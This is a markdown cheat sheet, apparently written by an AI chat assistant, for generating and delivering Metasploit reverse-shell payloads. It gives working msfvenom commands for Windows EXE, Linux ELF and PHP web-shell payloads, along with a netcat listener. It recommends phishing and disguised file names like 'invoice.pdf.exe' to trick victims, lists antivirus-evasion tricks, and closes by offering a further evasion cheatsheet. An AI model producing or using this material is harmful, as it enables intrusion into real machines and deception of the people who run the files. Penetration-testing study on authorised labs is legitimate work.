
---

# 🧠 Core Idea

> [!info] What you’re really doing  
> You are:

- Creating **code that gives you access**
    
- Delivering it to a target
    
- Catching the connection
    

👉 Everything else = optimization

---

# ⚡ Fast Payload Selection (REAL LIFE)

> [!tip] Don’t overthink it — use this decision flow:

### 🎯 If target is behind firewall (most cases)

👉 Use:

```text
reverse_tcp
```

---

### 🎯 If outbound traffic is restricted

👉 Use:

```text
reverse_https
```

✔ Blends with normal HTTPS traffic  
✔ Harder to detect

---

### 🎯 If you can connect directly to target

👉 Use:

```text
bind_tcp
```

❌ Rare in real-world (firewalls block it)

---

# 🧠 Payload Type Quick Picks

> [!success] Default go-to (90% of time)

```text
windows/meterpreter_reverse_tcp
```

---

> [!success] Stealthier option

```text
windows/meterpreter_reverse_https
```

---

> [!success] Lightweight (less detection sometimes)

```text
windows/shell_reverse_tcp
```

---

> [!success] Linux target

```text
linux/x64/shell_reverse_tcp
```

---

# 🔍 FAST Searching (Save Time ⏳)

---

## 🔹 Inside MSFconsole

```bash
search payload
search meterpreter
search reverse_tcp
```

---

> [!tip] Filter better

```bash
search type:payload platform:windows reverse
```

---

## 🔹 Using MSFvenom

```bash
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep reverse_tcp
```

---

> [!warning] Pro Trick  
> Pipe + grep = your best friend  
> 👉 Don’t scroll 500+ payloads manually

---

# ⚔️ Staged vs Stageless (REAL USE)

---

## 🔹 Staged

```text
windows/meterpreter/reverse_tcp
```

> [!info]

- Small initial payload
    
- Downloads rest
    

---

> [!good]  
> ✔ Smaller file  
> ✔ Easier delivery

---

> [!bad]  
> ❌ Needs stable connection  
> ❌ More detectable (network traffic)

---

## 🔹 Stageless

```text
windows/meterpreter_reverse_tcp
```

---

> [!info]

- Everything sent at once
    

---

> [!good]  
> ✔ More stable  
> ✔ Less network traffic

---

> [!bad]  
> ❌ Bigger file  
> ❌ Easier AV detection

---

> [!tip] Real-world rule

- Bad network → **stageless**
    
- Need small file → **staged**
    

---

# 🧠 Naming Shortcut (Never Forget)

> [!quote]  
> `/` = staged (split)  
> `_` = stageless (combined)

---

# ⚙️ MSFvenom Command Template

```bash
msfvenom -p <payload> LHOST=<your_ip> LPORT=<port> -f <format> > file
```

---

# 🔥 Real Commands You’ll Actually Use

---

## 🪟 Windows EXE

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe > update.exe
```

---

## 🐧 Linux ELF

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f elf > backup.elf
```

---

## 🌐 Web Shell (PHP)

```bash
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=443 -f raw > shell.php
```

---

# 📦 File Format Cheat Sheet

|Target|Format|
|---|---|
|Windows|exe|
|Linux|elf|
|Web|php / jsp / asp|

---

# 🎯 Listener (Don’t Forget This 😭)

```bash
nc -lvnp 443
```

---

> [!warning]  
> If listener isn’t running → payload = useless

---

# 🚚 Delivery (REAL WORLD)

> [!example]  
> How payload actually gets executed:

- 📧 Email (phishing)
    
- 🌐 Fake download
    
- 🧑‍💻 User tricked to run file
    
- 🛠️ Combined with exploit
    

---

> [!tip] Naming matters

```text
invoice.pdf.exe
salary_update.exe
backup_script.sh
```

👉 Humans are the weakest link

---

# ⚠️ AV Detection Reality

> [!danger]  
> Default payloads = **DETECTED instantly**

---

> [!tip]  
> To improve success:

- Use encoding (`-e`)
    
- Use HTTPS payloads
    
- Rename file
    
- Change extension tricks
    

---

# ⚡ Speed Tips (THIS WILL SAVE YOU)

---

> [!tip] Always use port 443  
> ✔ Less suspicious  
> ✔ Often allowed

---

> [!tip] Use HTTPS payloads  
> ✔ Blends with normal traffic

---

> [!tip] Keep payload simple  
> 👉 Don’t overcomplicate unless needed

---

> [!tip] Test locally first  
> 👉 Avoid wasting time debugging

---

# 🔁 Full Workflow (Burn this in your brain)

> [!summary]

1. Pick payload (based on situation)
    
2. Generate with msfvenom
    
3. Start listener
    
4. Deliver payload
    
5. Wait for execution
    
6. Catch shell
    

---

# 🧠 Real Pentester Mindset

> [!quote]  
> It’s not about generating payloads —  
> it’s about **getting someone or something to run them**

---

# 🔥 Final Cheat Table

|Scenario|Best Payload|
|---|---|
|Normal network|reverse_tcp|
|Restricted network|reverse_https|
|Low bandwidth|stageless|
|Need small file|staged|
|Stealth|meterpreter_reverse_https|
|Quick shell|shell_reverse_tcp|

---

If you want next level:

- 🔥 AV evasion cheatsheet
    
- 🧪 HTB exam shortcuts
    
- ⚡ Meterpreter post-exploitation cheatsheet
    

Just say 👍